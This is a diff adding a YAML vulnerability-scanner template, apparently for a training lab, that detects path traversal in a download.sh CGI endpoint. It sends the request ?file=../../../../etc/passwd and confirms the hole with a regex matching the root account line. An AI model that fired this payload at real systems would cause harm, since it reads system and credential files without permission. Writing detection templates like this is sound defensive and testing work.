@@ -1,0 +1,34 @@
+id: lab-path-traversal-download
+
+info:
+  name: ARGUS Lab - Path Traversal in download.sh
+  author: argus-lab
+  severity: high
+  description: |
+    The lab file-download endpoint /cgi-bin/download.sh joins the "file"
+    parameter to the document root without canonicalisation, allowing an
+    attacker to read arbitrary files such as /etc/passwd.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  classification:
+    cwe-id: CWE-22
+  tags: lab,lfi,traversal,cgi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/download.sh?file=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:.*"
